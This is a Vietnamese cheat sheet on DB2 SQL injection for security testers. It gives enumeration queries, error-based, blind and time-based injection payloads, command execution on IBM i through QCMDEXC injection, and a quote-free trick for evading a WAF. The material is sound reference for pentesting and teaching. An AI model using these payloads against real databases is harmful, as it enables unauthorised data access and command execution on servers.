# DB2 Injection

> IBM DB2 là một họ các hệ quản trị cơ sở dữ liệu quan hệ (RDBMS) được phát triển bởi IBM. Ban đầu được tạo ra vào những năm 1980 dành cho máy tính lớn (mainframe), DB2 đã phát triển để hỗ trợ nhiều nền tảng và khối lượng công việc khác nhau, bao gồm hệ thống phân tán, môi trường đám mây, và triển khai lai (hybrid).

## Tóm tắt

* [Chú thích trong DB2](#db2-comments)
* [Các cơ sở dữ liệu mặc định của DB2](#db2-default-databases)
* [Liệt kê thông tin DB2](#db2-enumeration)
* [Phương pháp khai thác DB2](#db2-methodology)
* [Khai thác dựa trên lỗi](#db2-error-based)
* [Khai thác dạng mù (Blind)](#db2-blind-based)
* [Khai thác dựa trên thời gian](#db2-time-based)
* [Thực thi lệnh trên DB2](#db2-command-execution)
* [Vượt qua WAF của DB2](#db2-waf-bypass)
* [Tài khoản và quyền hạn trong DB2](#db2-accounts-and-privileges)
* [Tài liệu tham khảo](#references)

## Chú thích trong DB2

| Loại | Mô tả              |
| ---- | ------------------ |
| `--` | Chú thích dạng SQL |

## Các cơ sở dữ liệu mặc định của DB2

| Tên       | Mô tả                                                                              |
| --------- | ----------------------------------------------------------------------------------- |
| SYSIBM    | Các bảng danh mục hệ thống cốt lõi lưu trữ metadata cho các đối tượng cơ sở dữ liệu. |
| SYSCAT    | Các view thân thiện với người dùng để truy cập metadata trong các bảng SYSIBM.       |
| SYSSTAT   | Các bảng thống kê được trình tối ưu hóa của DB2 sử dụng để tối ưu truy vấn.          |
| SYSPUBLIC | Metadata về các đối tượng có sẵn cho tất cả người dùng (được cấp cho PUBLIC).        |
| SYSIBMADM | Các view quản trị dùng để giám sát và quản lý hệ thống cơ sở dữ liệu.                |
| SYSTOOLs  | Các công cụ, tiện ích và đối tượng phụ trợ phục vụ quản trị và khắc phục sự cố.      |

## Liệt kê thông tin DB2

| Mô tả                    | Câu truy vấn SQL                                                                                      |
| ------------------------- | ------------------------------------------------------------------------------------------------------ |
| Phiên bản DBMS            | `select versionnumber, version_timestamp from sysibm.sysversions;`                                     |
| Phiên bản DBMS            | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo`                         |
| Phiên bản DBMS            | `select getvariable('sysibm.version') from sysibm.sysdummy1`                                           |
| Phiên bản DBMS            | `select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo`   |
| Phiên bản DBMS            | `select service_level,bld_level from sysibmadm.env_inst_info`                                          |
| Người dùng hiện tại       | `select user from sysibm.sysdummy1`                                                                    |
| Người dùng hiện tại       | `select session_user from sysibm.sysdummy1`                                                            |
| Người dùng hiện tại       | `select system_user from sysibm.sysdummy1`                                                             |
| Cơ sở dữ liệu hiện tại    | `select current server from sysibm.sysdummy1`                                                          |
| Thông tin hệ điều hành    | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info`                           |

## Phương pháp khai thác DB2

| Mô tả                     | Câu truy vấn SQL                                              |
| -------------------------- | ---------------------------------------------------------------- |
| Liệt kê cơ sở dữ liệu       | `SELECT distinct(table_catalog) FROM sysibm.tables`             |
| Liệt kê cơ sở dữ liệu       | `SELECT schemaname FROM syscat.schemata;`                       |
| Liệt kê cột                 | `SELECT name, tbname, coltype FROM sysibm.syscolumns`            |
| Liệt kê bảng                | `SELECT table_name FROM sysibm.tables`                           |
| Liệt kê bảng                | `SELECT name FROM sysibm.systables`                              |
| Liệt kê bảng                | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'`     |

## Khai thác dựa trên lỗi

```sql
-- Trả về tất cả trong một chuỗi định dạng xml
select xmlagg(xmlrow(table_schema)) from sysibm.tables

-- Tương tự nhưng không lặp lại các phần tử
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)

-- Trả về tất cả trong một chuỗi định dạng xml.
-- Có thể cần dùng CAST(xml2clob(… AS varchar(500)) để hiển thị kết quả.
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables 
```

## Khai thác dạng mù (Blind)

| Mô tả                     | Câu truy vấn SQL                                                                                                                       |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| Cắt chuỗi (Substring)      | `select substr('abc',2,1) FROM sysibm.sysdummy1`                                                                                        |
| Giá trị ASCII              | `select chr(65) from sysibm.sysdummy1`                                                                                                  |
| Chuyển CHAR sang ASCII     | `select ascii('A') from sysibm.sysdummy1`                                                                                               |
| Chọn dòng thứ N             | `select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only`  |
| Phép AND theo bit           | `select bitand(1,0) from sysibm.sysdummy1`                                                                                              |
| Phép AND NOT theo bit       | `select bitandnot(1,0) from sysibm.sysdummy1`                                                                                           |
| Phép OR theo bit            | `select bitor(1,0) from sysibm.sysdummy1`                                                                                               |
| Phép XOR theo bit           | `select bitxor(1,0) from sysibm.sysdummy1`                                                                                              |
| Phép NOT theo bit           | `select bitnot(1,0) from sysibm.sysdummy1`                                                                                              |

## Khai thác dựa trên thời gian

Các truy vấn nặng: nếu ký tự đầu của user bắt đầu bằng mã ascii 68 ('D'), truy vấn nặng sẽ được thực thi, làm trễ phản hồi.

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```

## Thực thi lệnh trên DB2

> Thủ tục và hàm vô hướng (scalar function) `QSYS2.QCMDEXC()` có thể được dùng để thực thi các lệnh CL của IBM i.

Sử dụng `QSYS2.QCMDEXC()` trên IBM i (trước đây gọi là AS-400), có thể đạt được khả năng thực thi lệnh.

```sql
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
```

Trong nhiều trường hợp, kết quả đầu ra của lệnh không được trả về trực tiếp. Cách tiếp cận sau hoạt động qua hai bước: đầu tiên, thực thi lệnh và chuyển hướng cả đầu ra chuẩn lẫn lỗi chuẩn vào `/tmp/qsh_output.txt`, sau đó đọc nội dung của tập tin đó bằng `QSYS2.IFS_READ_UTF8`.

```sql
QSYS2.QCMDEXC('QSH CMD(''system dspusrprf PROFILE > /tmp/qsh_output.txt 2>&1'')')
SELECT LINE FROM TABLE(QSYS2.IFS_READ_UTF8('/tmp/qsh_output.txt',2147483647,'NONE'))
```

## Vượt qua WAF của DB2

### Tránh sử dụng dấu nháy

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
```

## Tài khoản và quyền hạn trong DB2

| Mô tả                       | Câu truy vấn SQL                                                                  |
| ---------------------------- | ------------------------------------------------------------------------------------ |
| Liệt kê người dùng            | `select distinct(grantee) from sysibm.systabauth`                                   |
| Liệt kê người dùng            | `select distinct(definer) from syscat.schemata`                                     |
| Liệt kê người dùng            | `select distinct(authid) from sysibmadm.privileges`                                 |
| Liệt kê người dùng            | `select grantee from syscat.dbauth`                                                 |
| Liệt kê quyền hạn              | `select * from syscat.tabauth`                                                       |
| Liệt kê quyền hạn              | `select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies`                    |
| Liệt kê tài khoản DBA          | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'`             |
| Liệt kê tài khoản DBA          | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'`     |
| Vị trí tập tin DB               | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'`                |

## Tài liệu tham khảo

* [DB2 SQL injection cheat sheet - Adrián - May 20, 2012](https://web.archive.org/web/20211026090110/https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
* [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](https://web.archive.org/web/20260226035803/https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
* [QSYS2.QCMDEXC() - IBM Support - April 22, 2023](https://web.archive.org/web/20230305185053/https://www.ibm.com/support/pages/qsys2qcmdexc)
